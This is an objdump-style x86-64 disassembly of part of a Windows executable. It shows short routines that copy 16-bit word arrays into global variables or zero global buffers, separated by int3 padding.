   140008719:	cc                   	int3
   14000871a:	cc                   	int3
   14000871b:	cc                   	int3
   14000871c:	cc                   	int3
   14000871d:	cc                   	int3
   14000871e:	cc                   	int3
   14000871f:	cc                   	int3
   140008720:	c6 05 f3 b0 2b 00 01 	movb   $0x1,0x2bb0f3(%rip)        # 0x1402c381a
   140008727:	0f b7 01             	movzwl (%rcx),%eax
   14000872a:	66 89 05 bf b0 2b 00 	mov    %ax,0x2bb0bf(%rip)        # 0x1402c37f0
   140008731:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008735:	66 89 05 b6 b0 2b 00 	mov    %ax,0x2bb0b6(%rip)        # 0x1402c37f2
   14000873c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008740:	66 89 05 ad b0 2b 00 	mov    %ax,0x2bb0ad(%rip)        # 0x1402c37f4
   140008747:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000874b:	66 89 05 a4 b0 2b 00 	mov    %ax,0x2bb0a4(%rip)        # 0x1402c37f6
   140008752:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008756:	66 89 05 9b b0 2b 00 	mov    %ax,0x2bb09b(%rip)        # 0x1402c37f8
   14000875d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008761:	66 89 05 92 b0 2b 00 	mov    %ax,0x2bb092(%rip)        # 0x1402c37fa
   140008768:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000876c:	66 89 05 89 b0 2b 00 	mov    %ax,0x2bb089(%rip)        # 0x1402c37fc
   140008773:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008777:	66 89 05 80 b0 2b 00 	mov    %ax,0x2bb080(%rip)        # 0x1402c37fe
   14000877e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008782:	66 89 05 77 b0 2b 00 	mov    %ax,0x2bb077(%rip)        # 0x1402c3800
   140008789:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000878d:	66 89 05 6e b0 2b 00 	mov    %ax,0x2bb06e(%rip)        # 0x1402c3802
   140008794:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008798:	66 89 05 65 b0 2b 00 	mov    %ax,0x2bb065(%rip)        # 0x1402c3804
   14000879f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400087a3:	66 89 05 5c b0 2b 00 	mov    %ax,0x2bb05c(%rip)        # 0x1402c3806
   1400087aa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400087ae:	66 89 05 53 b0 2b 00 	mov    %ax,0x2bb053(%rip)        # 0x1402c3808
   1400087b5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400087b9:	66 89 05 4a b0 2b 00 	mov    %ax,0x2bb04a(%rip)        # 0x1402c380a
   1400087c0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400087c4:	66 89 05 41 b0 2b 00 	mov    %ax,0x2bb041(%rip)        # 0x1402c380c
   1400087cb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400087cf:	66 89 05 38 b0 2b 00 	mov    %ax,0x2bb038(%rip)        # 0x1402c380e
   1400087d6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400087da:	66 89 05 2f b0 2b 00 	mov    %ax,0x2bb02f(%rip)        # 0x1402c3810
   1400087e1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400087e5:	66 89 05 26 b0 2b 00 	mov    %ax,0x2bb026(%rip)        # 0x1402c3812
   1400087ec:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400087f0:	66 89 05 1d b0 2b 00 	mov    %ax,0x2bb01d(%rip)        # 0x1402c3814
   1400087f7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400087fb:	66 89 05 14 b0 2b 00 	mov    %ax,0x2bb014(%rip)        # 0x1402c3816
   140008802:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008806:	66 89 05 0b b0 2b 00 	mov    %ax,0x2bb00b(%rip)        # 0x1402c3818
   14000880d:	c3                   	ret
   14000880e:	cc                   	int3
   14000880f:	cc                   	int3
   140008810:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008813:	0f 11 05 f0 af 2b 00 	movups %xmm0,0x2baff0(%rip)        # 0x1402c380a
   14000881a:	0f 29 05 df af 2b 00 	movaps %xmm0,0x2bafdf(%rip)        # 0x1402c3800
   140008821:	0f 29 05 c8 af 2b 00 	movaps %xmm0,0x2bafc8(%rip)        # 0x1402c37f0
   140008828:	c3                   	ret
   140008829:	cc                   	int3
   14000882a:	cc                   	int3
   14000882b:	cc                   	int3
   14000882c:	cc                   	int3
   14000882d:	cc                   	int3
   14000882e:	cc                   	int3
   14000882f:	cc                   	int3
   140008830:	c6 05 0b b0 2b 00 01 	movb   $0x1,0x2bb00b(%rip)        # 0x1402c3842
   140008837:	0f b7 01             	movzwl (%rcx),%eax
   14000883a:	66 89 05 df af 2b 00 	mov    %ax,0x2bafdf(%rip)        # 0x1402c3820
   140008841:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008845:	66 89 05 d6 af 2b 00 	mov    %ax,0x2bafd6(%rip)        # 0x1402c3822
   14000884c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008850:	66 89 05 cd af 2b 00 	mov    %ax,0x2bafcd(%rip)        # 0x1402c3824
   140008857:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000885b:	66 89 05 c4 af 2b 00 	mov    %ax,0x2bafc4(%rip)        # 0x1402c3826
   140008862:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008866:	66 89 05 bb af 2b 00 	mov    %ax,0x2bafbb(%rip)        # 0x1402c3828
   14000886d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008871:	66 89 05 b2 af 2b 00 	mov    %ax,0x2bafb2(%rip)        # 0x1402c382a
   140008878:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000887c:	66 89 05 a9 af 2b 00 	mov    %ax,0x2bafa9(%rip)        # 0x1402c382c
   140008883:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008887:	66 89 05 a0 af 2b 00 	mov    %ax,0x2bafa0(%rip)        # 0x1402c382e
   14000888e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008892:	66 89 05 97 af 2b 00 	mov    %ax,0x2baf97(%rip)        # 0x1402c3830
   140008899:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000889d:	66 89 05 8e af 2b 00 	mov    %ax,0x2baf8e(%rip)        # 0x1402c3832
   1400088a4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400088a8:	66 89 05 85 af 2b 00 	mov    %ax,0x2baf85(%rip)        # 0x1402c3834
   1400088af:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400088b3:	66 89 05 7c af 2b 00 	mov    %ax,0x2baf7c(%rip)        # 0x1402c3836
   1400088ba:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400088be:	66 89 05 73 af 2b 00 	mov    %ax,0x2baf73(%rip)        # 0x1402c3838
   1400088c5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400088c9:	66 89 05 6a af 2b 00 	mov    %ax,0x2baf6a(%rip)        # 0x1402c383a
   1400088d0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400088d4:	66 89 05 61 af 2b 00 	mov    %ax,0x2baf61(%rip)        # 0x1402c383c
   1400088db:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400088df:	66 89 05 58 af 2b 00 	mov    %ax,0x2baf58(%rip)        # 0x1402c383e
   1400088e6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400088ea:	66 89 05 4f af 2b 00 	mov    %ax,0x2baf4f(%rip)        # 0x1402c3840
   1400088f1:	c3                   	ret
   1400088f2:	cc                   	int3
   1400088f3:	cc                   	int3
   1400088f4:	cc                   	int3
   1400088f5:	cc                   	int3
   1400088f6:	cc                   	int3
   1400088f7:	cc                   	int3
   1400088f8:	cc                   	int3
   1400088f9:	cc                   	int3
   1400088fa:	cc                   	int3
   1400088fb:	cc                   	int3
   1400088fc:	cc                   	int3
   1400088fd:	cc                   	int3
   1400088fe:	cc                   	int3
   1400088ff:	cc                   	int3
   140008900:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008903:	0f 29 05 26 af 2b 00 	movaps %xmm0,0x2baf26(%rip)        # 0x1402c3830
   14000890a:	0f 29 05 0f af 2b 00 	movaps %xmm0,0x2baf0f(%rip)        # 0x1402c3820
   140008911:	66 c7 05 26 af 2b 00 	movw   $0x0,0x2baf26(%rip)        # 0x1402c3840
   140008918:	00 00 
   14000891a:	c3                   	ret
   14000891b:	cc                   	int3
   14000891c:	cc                   	int3
   14000891d:	cc                   	int3
   14000891e:	cc                   	int3
   14000891f:	cc                   	int3
   140008920:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008923:	0f 11 05 30 af 2b 00 	movups %xmm0,0x2baf30(%rip)        # 0x1402c385a
   14000892a:	0f 29 05 1f af 2b 00 	movaps %xmm0,0x2baf1f(%rip)        # 0x1402c3850
   140008931:	c3                   	ret
   140008932:	cc                   	int3
   140008933:	cc                   	int3
   140008934:	cc                   	int3
   140008935:	cc                   	int3
   140008936:	cc                   	int3
   140008937:	cc                   	int3
   140008938:	cc                   	int3
   140008939:	cc                   	int3
   14000893a:	cc                   	int3
   14000893b:	cc                   	int3
   14000893c:	cc                   	int3
   14000893d:	cc                   	int3
   14000893e:	cc                   	int3
   14000893f:	cc                   	int3
   140008940:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008943:	0f 11 05 32 af 2b 00 	movups %xmm0,0x2baf32(%rip)        # 0x1402c387c
   14000894a:	0f 29 05 1f af 2b 00 	movaps %xmm0,0x2baf1f(%rip)        # 0x1402c3870
   140008951:	c3                   	ret
   140008952:	cc                   	int3
   140008953:	cc                   	int3
   140008954:	cc                   	int3
   140008955:	cc                   	int3
   140008956:	cc                   	int3
   140008957:	cc                   	int3
   140008958:	cc                   	int3
   140008959:	cc                   	int3
   14000895a:	cc                   	int3
   14000895b:	cc                   	int3
   14000895c:	cc                   	int3
   14000895d:	cc                   	int3
   14000895e:	cc                   	int3
   14000895f:	cc                   	int3
   140008960:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008963:	0f 29 05 86 af 2b 00 	movaps %xmm0,0x2baf86(%rip)        # 0x1402c38f0
   14000896a:	0f 29 05 6f af 2b 00 	movaps %xmm0,0x2baf6f(%rip)        # 0x1402c38e0
   140008971:	0f 29 05 58 af 2b 00 	movaps %xmm0,0x2baf58(%rip)        # 0x1402c38d0
   140008978:	0f 29 05 41 af 2b 00 	movaps %xmm0,0x2baf41(%rip)        # 0x1402c38c0
   14000897f:	0f 29 05 2a af 2b 00 	movaps %xmm0,0x2baf2a(%rip)        # 0x1402c38b0
   140008986:	0f 29 05 13 af 2b 00 	movaps %xmm0,0x2baf13(%rip)        # 0x1402c38a0
   14000898d:	0f 29 05 fc ae 2b 00 	movaps %xmm0,0x2baefc(%rip)        # 0x1402c3890
   140008994:	48 c7 05 5f af 2b 00 	movq   $0x0,0x2baf5f(%rip)        # 0x1402c38fe
   14000899b:	00 00 00 00 
   14000899f:	c3                   	ret
   1400089a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400089a3:	0f 29 05 66 af 2b 00 	movaps %xmm0,0x2baf66(%rip)        # 0x1402c3910
   1400089aa:	48 c7 05 69 af 2b 00 	movq   $0x0,0x2baf69(%rip)        # 0x1402c391e
   1400089b1:	00 00 00 00 
   1400089b5:	c3                   	ret
   1400089b6:	cc                   	int3
   1400089b7:	cc                   	int3
   1400089b8:	cc                   	int3
   1400089b9:	cc                   	int3
   1400089ba:	cc                   	int3
   1400089bb:	cc                   	int3
   1400089bc:	cc                   	int3
   1400089bd:	cc                   	int3
   1400089be:	cc                   	int3
   1400089bf:	cc                   	int3
   1400089c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400089c3:	0f 29 05 d6 af 2b 00 	movaps %xmm0,0x2bafd6(%rip)        # 0x1402c39a0
   1400089ca:	0f 29 05 bf af 2b 00 	movaps %xmm0,0x2bafbf(%rip)        # 0x1402c3990
   1400089d1:	0f 29 05 a8 af 2b 00 	movaps %xmm0,0x2bafa8(%rip)        # 0x1402c3980
   1400089d8:	0f 29 05 91 af 2b 00 	movaps %xmm0,0x2baf91(%rip)        # 0x1402c3970
   1400089df:	0f 29 05 7a af 2b 00 	movaps %xmm0,0x2baf7a(%rip)        # 0x1402c3960
   1400089e6:	0f 29 05 63 af 2b 00 	movaps %xmm0,0x2baf63(%rip)        # 0x1402c3950
   1400089ed:	0f 29 05 4c af 2b 00 	movaps %xmm0,0x2baf4c(%rip)        # 0x1402c3940
   1400089f4:	0f 29 05 35 af 2b 00 	movaps %xmm0,0x2baf35(%rip)        # 0x1402c3930
   1400089fb:	66 c7 05 ac af 2b 00 	movw   $0x0,0x2bafac(%rip)        # 0x1402c39b0
   140008a02:	00 00 
   140008a04:	c3                   	ret
   140008a05:	cc                   	int3
   140008a06:	cc                   	int3
   140008a07:	cc                   	int3
   140008a08:	cc                   	int3
   140008a09:	cc                   	int3
   140008a0a:	cc                   	int3
   140008a0b:	cc                   	int3
   140008a0c:	cc                   	int3
   140008a0d:	cc                   	int3
   140008a0e:	cc                   	int3
   140008a0f:	cc                   	int3
   140008a10:	c6 05 cb af 2b 00 01 	movb   $0x1,0x2bafcb(%rip)        # 0x1402c39e2
   140008a17:	0f b7 01             	movzwl (%rcx),%eax
   140008a1a:	66 89 05 9f af 2b 00 	mov    %ax,0x2baf9f(%rip)        # 0x1402c39c0
   140008a21:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008a25:	66 89 05 96 af 2b 00 	mov    %ax,0x2baf96(%rip)        # 0x1402c39c2
   140008a2c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008a30:	66 89 05 8d af 2b 00 	mov    %ax,0x2baf8d(%rip)        # 0x1402c39c4
   140008a37:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008a3b:	66 89 05 84 af 2b 00 	mov    %ax,0x2baf84(%rip)        # 0x1402c39c6
   140008a42:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008a46:	66 89 05 7b af 2b 00 	mov    %ax,0x2baf7b(%rip)        # 0x1402c39c8
   140008a4d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008a51:	66 89 05 72 af 2b 00 	mov    %ax,0x2baf72(%rip)        # 0x1402c39ca
   140008a58:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008a5c:	66 89 05 69 af 2b 00 	mov    %ax,0x2baf69(%rip)        # 0x1402c39cc
   140008a63:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008a67:	66 89 05 60 af 2b 00 	mov    %ax,0x2baf60(%rip)        # 0x1402c39ce
   140008a6e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008a72:	66 89 05 57 af 2b 00 	mov    %ax,0x2baf57(%rip)        # 0x1402c39d0
   140008a79:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008a7d:	66 89 05 4e af 2b 00 	mov    %ax,0x2baf4e(%rip)        # 0x1402c39d2
   140008a84:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008a88:	66 89 05 45 af 2b 00 	mov    %ax,0x2baf45(%rip)        # 0x1402c39d4
   140008a8f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008a93:	66 89 05 3c af 2b 00 	mov    %ax,0x2baf3c(%rip)        # 0x1402c39d6
   140008a9a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008a9e:	66 89 05 33 af 2b 00 	mov    %ax,0x2baf33(%rip)        # 0x1402c39d8
   140008aa5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008aa9:	66 89 05 2a af 2b 00 	mov    %ax,0x2baf2a(%rip)        # 0x1402c39da
   140008ab0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008ab4:	66 89 05 21 af 2b 00 	mov    %ax,0x2baf21(%rip)        # 0x1402c39dc
   140008abb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008abf:	66 89 05 18 af 2b 00 	mov    %ax,0x2baf18(%rip)        # 0x1402c39de
   140008ac6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008aca:	66 89 05 0f af 2b 00 	mov    %ax,0x2baf0f(%rip)        # 0x1402c39e0
   140008ad1:	c3                   	ret
   140008ad2:	cc                   	int3
   140008ad3:	cc                   	int3
   140008ad4:	cc                   	int3
   140008ad5:	cc                   	int3
   140008ad6:	cc                   	int3
   140008ad7:	cc                   	int3
   140008ad8:	cc                   	int3
   140008ad9:	cc                   	int3
   140008ada:	cc                   	int3
   140008adb:	cc                   	int3
   140008adc:	cc                   	int3
   140008add:	cc                   	int3
   140008ade:	cc                   	int3
   140008adf:	cc                   	int3
   140008ae0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008ae3:	0f 29 05 e6 ae 2b 00 	movaps %xmm0,0x2baee6(%rip)        # 0x1402c39d0
   140008aea:	0f 29 05 cf ae 2b 00 	movaps %xmm0,0x2baecf(%rip)        # 0x1402c39c0
   140008af1:	66 c7 05 e6 ae 2b 00 	movw   $0x0,0x2baee6(%rip)        # 0x1402c39e0
   140008af8:	00 00 
   140008afa:	c3                   	ret
   140008afb:	cc                   	int3
   140008afc:	cc                   	int3
   140008afd:	cc                   	int3
   140008afe:	cc                   	int3
   140008aff:	cc                   	int3
   140008b00:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b03:	0f 11 05 50 af 2b 00 	movups %xmm0,0x2baf50(%rip)        # 0x1402c3a5a
   140008b0a:	0f 29 05 3f af 2b 00 	movaps %xmm0,0x2baf3f(%rip)        # 0x1402c3a50
   140008b11:	0f 29 05 28 af 2b 00 	movaps %xmm0,0x2baf28(%rip)        # 0x1402c3a40
   140008b18:	0f 29 05 11 af 2b 00 	movaps %xmm0,0x2baf11(%rip)        # 0x1402c3a30
   140008b1f:	0f 29 05 fa ae 2b 00 	movaps %xmm0,0x2baefa(%rip)        # 0x1402c3a20
   140008b26:	0f 29 05 e3 ae 2b 00 	movaps %xmm0,0x2baee3(%rip)        # 0x1402c3a10
   140008b2d:	0f 29 05 cc ae 2b 00 	movaps %xmm0,0x2baecc(%rip)        # 0x1402c3a00
   140008b34:	0f 29 05 b5 ae 2b 00 	movaps %xmm0,0x2baeb5(%rip)        # 0x1402c39f0
   140008b3b:	c3                   	ret
   140008b3c:	cc                   	int3
   140008b3d:	cc                   	int3
   140008b3e:	cc                   	int3
   140008b3f:	cc                   	int3
   140008b40:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b43:	0f 11 05 30 af 2b 00 	movups %xmm0,0x2baf30(%rip)        # 0x1402c3a7a
   140008b4a:	0f 29 05 1f af 2b 00 	movaps %xmm0,0x2baf1f(%rip)        # 0x1402c3a70
   140008b51:	c3                   	ret
   140008b52:	cc                   	int3
   140008b53:	cc                   	int3
   140008b54:	cc                   	int3
   140008b55:	cc                   	int3
   140008b56:	cc                   	int3
   140008b57:	cc                   	int3
   140008b58:	cc                   	int3
   140008b59:	cc                   	int3
   140008b5a:	cc                   	int3
   140008b5b:	cc                   	int3
   140008b5c:	cc                   	int3
   140008b5d:	cc                   	int3
   140008b5e:	cc                   	int3
   140008b5f:	cc                   	int3
   140008b60:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b63:	0f 29 05 86 af 2b 00 	movaps %xmm0,0x2baf86(%rip)        # 0x1402c3af0
   140008b6a:	0f 29 05 6f af 2b 00 	movaps %xmm0,0x2baf6f(%rip)        # 0x1402c3ae0
   140008b71:	0f 29 05 58 af 2b 00 	movaps %xmm0,0x2baf58(%rip)        # 0x1402c3ad0
   140008b78:	0f 29 05 41 af 2b 00 	movaps %xmm0,0x2baf41(%rip)        # 0x1402c3ac0
   140008b7f:	0f 29 05 2a af 2b 00 	movaps %xmm0,0x2baf2a(%rip)        # 0x1402c3ab0
   140008b86:	0f 29 05 13 af 2b 00 	movaps %xmm0,0x2baf13(%rip)        # 0x1402c3aa0
   140008b8d:	0f 29 05 fc ae 2b 00 	movaps %xmm0,0x2baefc(%rip)        # 0x1402c3a90
   140008b94:	66 c7 05 63 af 2b 00 	movw   $0x0,0x2baf63(%rip)        # 0x1402c3b00
   140008b9b:	00 00 
   140008b9d:	c3                   	ret
   140008b9e:	cc                   	int3
   140008b9f:	cc                   	int3
   140008ba0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008ba3:	0f 29 05 66 af 2b 00 	movaps %xmm0,0x2baf66(%rip)        # 0x1402c3b10
   140008baa:	66 c7 05 6d af 2b 00 	movw   $0x0,0x2baf6d(%rip)        # 0x1402c3b20
   140008bb1:	00 00 
   140008bb3:	c3                   	ret
   140008bb4:	cc                   	int3
   140008bb5:	cc                   	int3
   140008bb6:	cc                   	int3
   140008bb7:	cc                   	int3
   140008bb8:	cc                   	int3
   140008bb9:	cc                   	int3
   140008bba:	cc                   	int3
   140008bbb:	cc                   	int3
   140008bbc:	cc                   	int3
   140008bbd:	cc                   	int3
   140008bbe:	cc                   	int3
   140008bbf:	cc                   	int3
   140008bc0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008bc3:	0f 29 05 c6 af 2b 00 	movaps %xmm0,0x2bafc6(%rip)        # 0x1402c3b90
   140008bca:	0f 29 05 af af 2b 00 	movaps %xmm0,0x2bafaf(%rip)        # 0x1402c3b80
   140008bd1:	0f 29 05 98 af 2b 00 	movaps %xmm0,0x2baf98(%rip)        # 0x1402c3b70
   140008bd8:	0f 29 05 81 af 2b 00 	movaps %xmm0,0x2baf81(%rip)        # 0x1402c3b60
   140008bdf:	0f 29 05 6a af 2b 00 	movaps %xmm0,0x2baf6a(%rip)        # 0x1402c3b50
   140008be6:	0f 29 05 53 af 2b 00 	movaps %xmm0,0x2baf53(%rip)        # 0x1402c3b40
   140008bed:	0f 29 05 3c af 2b 00 	movaps %xmm0,0x2baf3c(%rip)        # 0x1402c3b30
   140008bf4:	c7 05 a2 af 2b 00 00 	movl   $0x0,0x2bafa2(%rip)        # 0x1402c3ba0
   140008bfb:	00 00 00 
   140008bfe:	c3                   	ret
   140008bff:	cc                   	int3
   140008c00:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008c03:	0f 29 05 a6 af 2b 00 	movaps %xmm0,0x2bafa6(%rip)        # 0x1402c3bb0
   140008c0a:	c7 05 ac af 2b 00 00 	movl   $0x0,0x2bafac(%rip)        # 0x1402c3bc0
   140008c11:	00 00 00 
   140008c14:	c3                   	ret
   140008c15:	cc                   	int3
   140008c16:	cc                   	int3
   140008c17:	cc                   	int3
   140008c18:	cc                   	int3
   140008c19:	cc                   	int3
   140008c1a:	cc                   	int3
   140008c1b:	cc                   	int3
   140008c1c:	cc                   	int3
   140008c1d:	cc                   	int3
   140008c1e:	cc                   	int3
   140008c1f:	cc                   	int3
   140008c20:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008c23:	0f 11 05 b2 af 2b 00 	movups %xmm0,0x2bafb2(%rip)        # 0x1402c3bdc
   140008c2a:	0f 29 05 9f af 2b 00 	movaps %xmm0,0x2baf9f(%rip)        # 0x1402c3bd0
   140008c31:	c3                   	ret
   140008c32:	cc                   	int3
   140008c33:	cc                   	int3
   140008c34:	cc                   	int3
   140008c35:	cc                   	int3
   140008c36:	cc                   	int3
   140008c37:	cc                   	int3
   140008c38:	cc                   	int3
   140008c39:	cc                   	int3
   140008c3a:	cc                   	int3
   140008c3b:	cc                   	int3
   140008c3c:	cc                   	int3
   140008c3d:	cc                   	int3
   140008c3e:	cc                   	int3
   140008c3f:	cc                   	int3
   140008c40:	c6 05 e5 af 2b 00 01 	movb   $0x1,0x2bafe5(%rip)        # 0x1402c3c2c
   140008c47:	0f b7 01             	movzwl (%rcx),%eax
   140008c4a:	66 89 05 9f af 2b 00 	mov    %ax,0x2baf9f(%rip)        # 0x1402c3bf0
   140008c51:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008c55:	66 89 05 96 af 2b 00 	mov    %ax,0x2baf96(%rip)        # 0x1402c3bf2
   140008c5c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008c60:	66 89 05 8d af 2b 00 	mov    %ax,0x2baf8d(%rip)        # 0x1402c3bf4
   140008c67:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008c6b:	66 89 05 84 af 2b 00 	mov    %ax,0x2baf84(%rip)        # 0x1402c3bf6
   140008c72:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008c76:	66 89 05 7b af 2b 00 	mov    %ax,0x2baf7b(%rip)        # 0x1402c3bf8
   140008c7d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008c81:	66 89 05 72 af 2b 00 	mov    %ax,0x2baf72(%rip)        # 0x1402c3bfa
   140008c88:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008c8c:	66 89 05 69 af 2b 00 	mov    %ax,0x2baf69(%rip)        # 0x1402c3bfc
   140008c93:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008c97:	66 89 05 60 af 2b 00 	mov    %ax,0x2baf60(%rip)        # 0x1402c3bfe
   140008c9e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008ca2:	66 89 05 57 af 2b 00 	mov    %ax,0x2baf57(%rip)        # 0x1402c3c00
   140008ca9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008cad:	66 89 05 4e af 2b 00 	mov    %ax,0x2baf4e(%rip)        # 0x1402c3c02
   140008cb4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008cb8:	66 89 05 45 af 2b 00 	mov    %ax,0x2baf45(%rip)        # 0x1402c3c04
   140008cbf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008cc3:	66 89 05 3c af 2b 00 	mov    %ax,0x2baf3c(%rip)        # 0x1402c3c06
   140008cca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008cce:	66 89 05 33 af 2b 00 	mov    %ax,0x2baf33(%rip)        # 0x1402c3c08
   140008cd5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008cd9:	66 89 05 2a af 2b 00 	mov    %ax,0x2baf2a(%rip)        # 0x1402c3c0a
   140008ce0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008ce4:	66 89 05 21 af 2b 00 	mov    %ax,0x2baf21(%rip)        # 0x1402c3c0c
   140008ceb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008cef:	66 89 05 18 af 2b 00 	mov    %ax,0x2baf18(%rip)        # 0x1402c3c0e
   140008cf6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008cfa:	66 89 05 0f af 2b 00 	mov    %ax,0x2baf0f(%rip)        # 0x1402c3c10
   140008d01:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008d05:	66 89 05 06 af 2b 00 	mov    %ax,0x2baf06(%rip)        # 0x1402c3c12
   140008d0c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008d10:	66 89 05 fd ae 2b 00 	mov    %ax,0x2baefd(%rip)        # 0x1402c3c14
   140008d17:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008d1b:	66 89 05 f4 ae 2b 00 	mov    %ax,0x2baef4(%rip)        # 0x1402c3c16
   140008d22:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008d26:	66 89 05 eb ae 2b 00 	mov    %ax,0x2baeeb(%rip)        # 0x1402c3c18
   140008d2d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008d31:	66 89 05 e2 ae 2b 00 	mov    %ax,0x2baee2(%rip)        # 0x1402c3c1a
   140008d38:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140008d3c:	66 89 05 d9 ae 2b 00 	mov    %ax,0x2baed9(%rip)        # 0x1402c3c1c
   140008d43:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008d47:	66 89 05 d0 ae 2b 00 	mov    %ax,0x2baed0(%rip)        # 0x1402c3c1e
   140008d4e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008d52:	66 89 05 c7 ae 2b 00 	mov    %ax,0x2baec7(%rip)        # 0x1402c3c20
   140008d59:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140008d5d:	66 89 05 be ae 2b 00 	mov    %ax,0x2baebe(%rip)        # 0x1402c3c22
   140008d64:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008d68:	66 89 05 b5 ae 2b 00 	mov    %ax,0x2baeb5(%rip)        # 0x1402c3c24
   140008d6f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008d73:	66 89 05 ac ae 2b 00 	mov    %ax,0x2baeac(%rip)        # 0x1402c3c26
   140008d7a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140008d7e:	66 89 05 a3 ae 2b 00 	mov    %ax,0x2baea3(%rip)        # 0x1402c3c28
   140008d85:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008d89:	66 89 05 9a ae 2b 00 	mov    %ax,0x2bae9a(%rip)        # 0x1402c3c2a
   140008d90:	c3                   	ret
   140008d91:	cc                   	int3
   140008d92:	cc                   	int3
   140008d93:	cc                   	int3
   140008d94:	cc                   	int3
   140008d95:	cc                   	int3
   140008d96:	cc                   	int3
   140008d97:	cc                   	int3
   140008d98:	cc                   	int3
   140008d99:	cc                   	int3
   140008d9a:	cc                   	int3
   140008d9b:	cc                   	int3
